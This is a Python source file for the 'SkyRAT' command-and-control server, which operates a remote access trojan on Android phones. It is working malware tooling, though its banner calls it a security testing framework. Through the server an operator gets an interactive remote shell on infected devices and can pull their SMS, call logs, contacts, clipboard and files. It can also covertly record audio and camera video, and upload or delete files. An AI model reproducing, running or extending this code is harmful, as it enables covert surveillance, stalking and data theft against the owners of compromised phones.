#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SkyRAT Command & Control Server
Handles communication with Android clients
"""

import sys
import os
import base64
import time
import socket
import threading
import queue
import select
import xml.etree.ElementTree as ET
from pathlib import Path
import json

# UTF-8 configuration
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

def clear_screen():
    """Clear screen based on OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_separator():
    """Get OS-specific path separator"""
    return "\\" if os.name == 'nt' else "/"

# Create dumps directory
DUMPS_DIR = Path("dumps")
DUMPS_DIR.mkdir(exist_ok=True)

class SkyRATServer:
    def __init__(self, debug=False):
        self.debug = debug
        self.separator = get_separator()
        
    def log(self, message, level="INFO"):
        """Enhanced logging with colors"""
        colors = {
            "INFO": "\033[1m\033[36m",
            "SUCCESS": "\033[1m\033[32m", 
            "WARNING": "\033[1m\033[33m",
            "ERROR": "\033[1m\033[31m",
            "DEBUG": "\033[1m\033[37m"
        }
        color = colors.get(level, "")
        print(f"{color}[{level}]\033[0m {message}")
    
    def recvall(self, sock, timeout=15.0):
        """Enhanced receive function with configurable timeout"""
        buff = ""
        sock.settimeout(timeout)
        
        try:
            start_time = time.time()
            
            while "END123" not in buff:
                try:
                    chunk = sock.recv(8192).decode("UTF-8", "ignore")
                    if not chunk:
                        elapsed = time.time() - start_time
                        if self.debug:
                            print(f"[DEBUG] Connection closed after {elapsed:.2f}s")
                        break
                        
                    buff += chunk
                    
                    # Prevent memory issues with very large responses
                    if len(buff) > 50 * 1024 * 1024:  # 50MB limit
                        self.log("Large response truncated", "WARNING")
                        break
                        
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if buff:
                        if self.debug:
                            print(f"[DEBUG] Timeout after {elapsed:.2f}s, got {len(buff)} bytes")
                        break
                    else:
                        self.log(f"Complete timeout after {elapsed:.2f}s - command may still be processing", "WARNING")
                        return "TIMEOUT: No response received (command may still be running)"
                except Exception as e:
                    self.log(f"Receive error: {e}", "ERROR")
                    break
            
            # Clean up the response
            if "END123" in buff:
                response = buff.split("END123")[0]
                elapsed = time.time() - start_time
                if self.debug:
                    print(f"[DEBUG] Response received in {elapsed:.2f}s ({len(response)} chars)")
                return response.strip()
            
            return buff.strip()
            
        except Exception as e:
            self.log(f"Error in recvall: {e}", "ERROR")
            return buff.strip()

    def recvall_shell(self, sock):
        """Shell-specific receive function"""
        buff = ""
        data = ""
        ready = select.select([sock], [], [], 5)
        while "END123" not in data:
            if ready[0]:
                data = sock.recv(4096).decode("UTF-8", "ignore")
                buff += data
            else:
                buff = "bogus"
                return buff
        return buff

    def save_timestamped_file(self, data_type, content, extension="txt"):
        """Save data to timestamped file"""
        try:
            timestr = time.strftime("%Y%m%d-%H%M%S")
            filename = DUMPS_DIR / f"{data_type}_{timestr}.{extension}"
            
            with open(filename, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            
            self.log(f"Data exported to: \033[1m\033[32m{filename.absolute()}\033[0m", "SUCCESS")
            return filename
            
        except Exception as e:
            self.log(f"Failed to save {data_type}: {e}", "ERROR")
            return None

    def handle_download(self, client, command):
        """Handle file download from device"""
        file_path = command.replace("download", "").strip()
        if not file_path:
            self.log("Usage: download <file_path>", "ERROR")
            return
        
        self.log(f"Downloading file: {file_path}")
        
        try:
            response = self.recvall(client, timeout=30.0)
            
            if response.startswith("getFile"):
                # New format handling
                file_data_response = self.recvall(client, timeout=60.0)
                if "|_|" in file_data_response:
                    file_parts = file_data_response.split("|_|")
                    if len(file_parts) >= 3:
                        filename = file_parts[0]
                        extension = file_parts[1]
                        base64_data = file_parts[2]
                        self.save_downloaded_file(filename, extension, base64_data)
                    else:
                        self.log("Invalid file data format", "ERROR")
                else:
                    self.log("Invalid download response", "ERROR")
            elif "ERROR:" in response:
                self.log(response, "ERROR")
            elif "|_|" in response:
                # Legacy format
                file_parts = response.split("|_|")
                if len(file_parts) >= 3:
                    filename = file_parts[0]
                    extension = file_parts[1] 
                    base64_data = file_parts[2]
                    self.save_downloaded_file(filename, extension, base64_data)
                else:
                    self.log("Invalid response format", "ERROR")
            else:
                self.log(f"Unexpected response: {response[:100]}...", "ERROR")
                
        except Exception as e:
            self.log(f"Download failed: {e}", "ERROR")

    def save_downloaded_file(self, filename, extension, base64_data):
        """Save downloaded file with error handling"""
        try:
            timestr = time.strftime("%Y%m%d-%H%M%S")
            safe_filename = "".join(c for c in filename if c.isalnum() or c in '._-')
            if not safe_filename:
                safe_filename = f"downloaded_file_{timestr}"
                
            file_path = DUMPS_DIR / f"Downloaded_{timestr}_{safe_filename}.{extension}"
            clean_base64 = base64_data.replace('\n', '').replace('\r', '').replace(' ', '')
            
            file_data = base64.b64decode(clean_base64)
            
            with open(file_path, 'wb') as f:
                f.write(file_data)
            
            self.log(f"File downloaded successfully:", "SUCCESS")
            print(f"  Original: {filename}.{extension}")
            print(f"  Saved as: {file_path.absolute()}")
            print(f"  Size: {len(file_data)} bytes")
            
        except Exception as e:
            self.log(f"Failed to save file: {e}", "ERROR")

    def simple_upload(self, client, file_path):
        """Simple upload function"""
        try:
            file_path = Path(file_path)
            if not file_path.exists():
                self.log(f"File not found: {file_path}", "ERROR")
                return
            
            filename = file_path.name
            file_size = file_path.stat().st_size
            
            self.log(f"Uploading: {filename} ({file_size} bytes)")
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            encoded_data = base64.b64encode(file_data).decode('utf-8')
            upload_cmd = f"upload {filename} {encoded_data}\n"
            client.send(upload_cmd.encode("UTF-8"))
            
            response = self.recvall(client, timeout=30.0)
            
            if "SUCCESS:" in response:
                self.log(response.replace("SUCCESS:", "").strip(), "SUCCESS")
            elif "ERROR:" in response:
                self.log(response.replace("ERROR:", "").strip(), "ERROR")
            else:
                self.log(response)
                
        except Exception as e:
            self.log(f"Upload failed: {e}", "ERROR")

    def handle_data_export(self, client, command):
        """Handle data export commands"""
        data_types = {
            "getContacts": "Contacts",
            "getApps": "Applications", 
            "getPhotos": "Photos_Info",
            "getAudio": "Audio_Info",
            "getVideos": "Videos_Info"
        }
        
        data_type = data_types.get(command, command)
        self.log(f"Exporting {data_type.lower()}...")
        
        response = self.recvall(client, timeout=20.0)
        if response and "Permission denied" not in response and not response.startswith("TIMEOUT:"):
            self.save_timestamped_file(data_type, response)
        else:
            self.log(response or "No data received", "ERROR")

    def read_sms(self, client, sms_type):
        """Read SMS messages"""
        self.log(f"Getting {sms_type} SMS")
        
        msg = self.recvall(client, timeout=20.0)
        
        if "Permission denied" in msg or "No SMS" in msg or msg.startswith("TIMEOUT:"):
            print(msg)
        else:
            filename = self.save_timestamped_file(f"{sms_type}_SMS", msg)

    def get_call_logs(self, client):
        """Get call logs"""
        self.log("Getting Call Logs")
        
        msg = self.recvall(client, timeout=20.0)
        
        if "No call logs" in msg or "Permission denied" in msg or msg.startswith("TIMEOUT:"):
            print(msg.strip())
        else:
            self.save_timestamped_file("Call_Logs", msg)

    def stop_audio_recording(self, client):
        """Stop audio recording and download"""
        self.log("Downloading Audio")
        timestr = time.strftime("%Y%m%d-%H%M%S")
        
        try:
            data = self.recvall(client, timeout=30.0)
            
            if data.startswith("TIMEOUT:"):
                self.log(data, "ERROR")
                return
            
            # Handle audio data
            audio_data = ""
            audio_format = "m4a"  # Default
            
            if "AUDIO_DATA:" in data:
                lines = data.split('\n')
                for line in lines:
                    if 'Format:' in line:
                        if 'M4A' in line:
                            audio_format = "m4a"
                        elif '3GP' in line:
                            audio_format = "3gp"
                        elif 'MP4' in line:
                            audio_format = "mp4"
                
                audio_data = data.split("AUDIO_DATA:")[1].strip()
                if "END123" in audio_data:
                    audio_data = audio_data.split("END123")[0].strip()
            else:
                audio_data = data.strip().replace("END123", "").strip()
                audio_format = "mp4"
            
            filename = DUMPS_DIR / f"Audio_{timestr}.{audio_format}"
            clean_audio_data = audio_data.replace('\n', '').replace('\r', '').replace(' ', '')
            
            with open(filename, 'wb') as audio:
                audio_bytes = base64.b64decode(clean_audio_data)
                audio.write(audio_bytes)
                
            self.log(f"Audio saved as: \033[1m\033[32m{filename.absolute()}\033[0m", "SUCCESS")
            print(f"Format: {audio_format.upper()}")
            print(f"Size: {len(audio_bytes)} bytes ({len(audio_bytes)/1024:.1f} KB)")
            
        except Exception as e:
            self.log(f"Error processing audio: {e}", "ERROR")

    def stop_video_recording(self, client):
        """Stop video recording and download"""
        self.log("Downloading Video (this may take a while)")
        timestr = time.strftime("%Y%m%d-%H%M%S")
        
        try:
            data = self.recvall(client, timeout=60.0)
            
            if data.startswith("TIMEOUT:"):
                self.log(data, "ERROR")
                return
            
            if "VIDEO_DATA:" in data:
                parts = data.split("VIDEO_DATA:")
                metadata = parts[0]
                video_base64 = parts[1].strip() if len(parts) > 1 else ""
                
                video_base64 = video_base64.replace("END123", "").strip()
                video_base64 = video_base64.replace('\n', '').replace('\r', '').replace(' ', '')
                
                video_format = "mp4"  # Default
                if "3GP" in metadata:
                    video_format = "3gp"
                
                filename = DUMPS_DIR / f"Video_{timestr}.{video_format}"
                video_bytes = base64.b64decode(video_base64)
                
                with open(filename, 'wb') as f:
                    f.write(video_bytes)
                
                self.log("Video saved successfully!", "SUCCESS")
                print(f"File: \033[1m\033[32m{filename.absolute()}\033[0m")
                print(f"Format: {video_format.upper()}")
                print(f"Size: {len(video_bytes)} bytes ({len(video_bytes)/1024/1024:.1f} MB)")
                
                # Print metadata if available
                if metadata.strip():
                    print("Video Info:")
                    for line in metadata.split('\n'):
                        if line.strip() and ('Size:' in line or 'Format:' in line or 'File:' in line):
                            print(f"  {line.strip()}")
            else:
                self.log("No video data found in response", "ERROR")
                if self.debug:
                    print(f"Response preview: {data[:200]}...")
                
        except Exception as e:
            self.log(f"Error processing video: {e}", "ERROR")

    def interactive_shell(self, client):
        """Interactive shell session"""
        self.log("Starting shell session...")
        
        while True:
            msg = self.recvall_shell(client)
            
            if "Exiting" in msg:
                print("\033[1m\033[33m----------Exiting Shell----------\n")
                return
                
            if msg != "bogus" and msg.strip():
                lines = msg.split("\n")
                for line in lines[:-2]:
                    if line.strip():
                        print(line)
            
            print(" ")
            command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
            
            if command.strip() == "clear":
                client.send("clear\n".encode("UTF-8"))
                clear_screen()
            elif command.strip() == "exit":
                client.send("exit\n".encode("UTF-8"))
                break
            else:
                client.send((command + "\n").encode("UTF-8"))

def animate_waiting(message):
    """Animate waiting message"""
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write(f"\r\033[1m\033[36m[INFO]\033[0m {message}\033[31m{char}\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def connection_checker(socket_obj, queue_obj):
    """Check for incoming connections"""
    conn, addr = socket_obj.accept()
    queue_obj.put([conn, addr])
    return conn, addr

def print_help():
    """Print comprehensive help"""
    help_text = """
    === SKYRAT COMMAND REFERENCE ===

    DEVICE INFORMATION:
    deviceInfo                 --> Complete device information
    getIP                      --> Device IP address
    getMACAddress              --> MAC address information
    getSimDetails              --> SIM card details
    sysinfo                    --> System information (memory, storage, CPU)

    FILE OPERATIONS:
    pwd                        --> Show current directory
    cd <path>                  --> Change directory
    ls [path]                  --> List directory contents
    download <file>            --> Download file (base64 encoded)
    upload <filename>          --> Upload file to device
    delete <path>              --> Delete file or directory
    mkdir <path>               --> Create directory

    SYSTEM OPERATIONS:
    ps                         --> List running processes
    kill <process>             --> Kill process by name
    shell <command>            --> Execute shell command
    netstat                    --> Network connections
    ping <host>                --> Ping host

    DATA ACCESS:
    getSMS [inbox|sent]        --> SMS messages
    getCallLogs                --> Call history
    getContacts                --> Contact list
    getApps                    --> Installed applications
    getPhotos                  --> Photo information
    getAudio                   --> Audio files information
    getVideos                  --> Video files information

    CAMERA/VIDEO:
    camList                    --> List available cameras
    startVideo [cameraID]      --> Start video recording (takes 5-10 seconds)
    stopVideo                  --> Stop video recording and download

    CLIPBOARD:
    getClipData                --> Get clipboard content
    setClip <text>             --> Set clipboard content

    AUDIO RECORDING:
    startAudio                 --> Start audio recording (takes 2-5 seconds)
    stopAudio                  --> Stop and download audio

    DEVICE CONTROL:
    vibrate [times]            --> Vibrate device
    clear                      --> Clear screen
    exit                       --> Exit the interpreter

    USAGE EXAMPLES:
    ls /sdcard/Download        --> List download folder
    download /sdcard/photo.jpg --> Download a photo
    startVideo 0               --> Record with back camera (wait for confirmation)
    shell cat /proc/version    --> Get kernel version
    ping google.com            --> Test internet connectivity

    NOTE: Video/Audio commands take time - wait for response before next command!
    """
    print(help_text)

def get_shell(ip, port):
    """Main shell function - entry point for C&C server"""
    server = SkyRATServer()
    
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        server.log(f"Socket binding failed: {e}", "ERROR")
        return

    soc.listen(2)
    
    # Print SkyRAT banner
    banner = """\033[1m\033[91m
 ____  _          ____      _  _____ 
/ ___|| | ___   _|  _ \    / \|_   _|
\___ \| |/ / | | | |_) |  / _ \ | |  
 ___) |   <| |_| |  _ <  / ___ \| |  
|____/|_|\_\\__, |_| \_\/_/   \_\_|  
            |___/                    

    Android Security Testing Framework
    \033[93mBy Tech Sky - Security Research Team\033[0m
    """
    print(banner)
    
    while True:
        que = queue.Queue()
        t = threading.Thread(target=connection_checker, args=[soc, que])
        t.daemon = True
        t.start()
        
        while t.is_alive(): 
            animate_waiting("Waiting for Connections  ")
        t.join()
        
        conn, addr = que.get()
        clear_screen()
        print(f"\033[1m\033[33mGot connection from \033[31m{addr}\033[0m")
        print(" ")
        
        # Handle welcome message
        try:
            server.log("Waiting for device information...")
            conn.settimeout(10.0)
            welcome_msg = server.recvall(conn, timeout=10.0)
            if welcome_msg and "Hello there" in welcome_msg:
                print(f"\033[1m{welcome_msg}\033[0m")
            conn.settimeout(None)
        except Exception as e:
            server.log(f"Could not get welcome message: {e}", "WARNING")
        
        # Main command loop
        while True:
            try:
                message_to_send = input("\033[1m\033[36mSkyRAT:/> \033[0m").strip()
                
                # Handle local commands
                if message_to_send == "exit":
                    conn.send((message_to_send + "\n").encode("UTF-8"))
                    print(" ")
                    print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
                    break
                
                if message_to_send == "clear":
                    clear_screen()
                    continue
                
                if message_to_send == "help":
                    print_help()
                    continue
                    
                if not message_to_send:
                    continue

                # Send command to device
                conn.send((message_to_send + "\n").encode("UTF-8"))
                
                # Handle responses with appropriate timeouts
                if message_to_send.startswith("startVideo"):
                    server.log("Starting video recording (this may take 5-10 seconds)...")
                    response = server.recvall(conn, timeout=30.0)
                    print(response)
                    if "successfully" in response.lower():
                        server.log("Video recording is now active!", "SUCCESS")
                    
                elif message_to_send == "stopVideo":
                    server.log("Stopping video recording and downloading...")
                    server.stop_video_recording(conn)
                    
                elif message_to_send.startswith("startAudio"):
                    server.log("Starting audio recording (this may take 2-5 seconds)...")
                    response = server.recvall(conn, timeout=20.0)
                    print(response)
                    if "successfully" in response.lower():
                        server.log("Audio recording is now active!", "SUCCESS")
                    
                elif message_to_send == "stopAudio":
                    server.stop_audio_recording(conn)
                    
                elif message_to_send == "camList":
                    server.log("Getting camera list...")
                    response = server.recvall(conn, timeout=10.0)
                    print(response)
                    
                elif message_to_send.startswith("getSMS"):
                    sms_type = "inbox"
                    if " " in message_to_send:
                        sms_type = message_to_send.split(" ")[1]
                    server.read_sms(conn, sms_type)
                    
                elif message_to_send == "getCallLogs":
                    server.get_call_logs(conn)
                    
                elif message_to_send == "shell":
                    server.interactive_shell(conn)
                    
                elif message_to_send.startswith("download"):
                    server.handle_download(conn, message_to_send)
                    
                elif message_to_send in ["getContacts", "getApps", "getPhotos", "getAudio", "getVideos"]:
                    server.handle_data_export(conn, message_to_send)
                    
                elif message_to_send.startswith("upload "):
                    file_path = message_to_send.replace("upload ", "").strip()
                    server.simple_upload(conn, file_path)
                    
                elif message_to_send.startswith("delete"):
                    server.log("Processing delete command...")
                    response = server.recvall(conn, timeout=15.0)
                    if "SUCCESS:" in response:
                        server.log("Delete completed!", "SUCCESS")
                        lines = response.split('\n')
                        for line in lines:
                            if line.strip():
                                print(f"  {line.strip()}")
                    else:
                        print(response)
                        
                else:
                    # Regular command - standard timeout
                    response = server.recvall(conn, timeout=15.0)
                    if response:
                        if response.startswith("TIMEOUT:"):
                            server.log(response, "ERROR")
                        elif "Unknown Command" in response:
                            server.log(response, "ERROR")
                        elif "Permission denied" in response:
                            server.log(response, "WARNING")
                        else:
                            print(response)
                    else:
                        server.log("No response received", "WARNING")
                
            except KeyboardInterrupt:
                print("\nExiting...")
                break
            except Exception as e:
                server.log(f"Connection error: {e}", "ERROR")
                break
        
        # Close connection
        try:
            conn.close()
        except:
            pass